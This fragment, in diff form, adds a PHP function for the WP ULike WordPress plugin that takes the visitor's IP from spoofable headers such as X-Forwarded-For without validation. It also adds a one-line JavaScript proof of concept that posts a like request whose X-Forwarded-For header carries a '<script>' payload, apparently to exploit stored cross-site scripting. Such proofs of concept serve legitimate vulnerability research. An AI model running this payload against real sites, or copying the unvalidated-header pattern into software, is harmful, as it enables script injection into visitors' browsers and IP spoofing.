@@ -1,0 +1,25 @@
+ function wp_ulike_get_real_ip() {
+                if (getenv('HTTP_CLIENT_IP')) {
+                        $ip = getenv('HTTP_CLIENT_IP');
+                } elseif (getenv('HTTP_X_FORWARDED_FOR')) {
+                        $ip = getenv('HTTP_X_FORWARDED_FOR');
+                } elseif (getenv('HTTP_X_FORWARDED')) {
+                        $ip = getenv('HTTP_X_FORWARDED');
+                } elseif (getenv('HTTP_FORWARDED_FOR')) {
+                        $ip = getenv('HTTP_FORWARDED_FOR');
+                } elseif (getenv('HTTP_FORWARDED')) {
+                        $ip = getenv('HTTP_FORWARDED');
+                } else {
+                        $ip = $_SERVER['REMOTE_ADDR'];
+                }
+
+                return $ip;
+        }
+
+
+
+
+var d=document.querySelector('.wpulike-default a').dataset;jQuery.ajax('/wp-admin/admin-ajax.php', {method: 'POST', headers: {'X-Forwarded-For': '<script>alert(1)</script>'},data: {action: 'wp_ulike_process', id: d.ulikeId, status: d.ulikeStatus, type: d.ulikeType, nonce: d.ulikeNonce}})
+
+
+
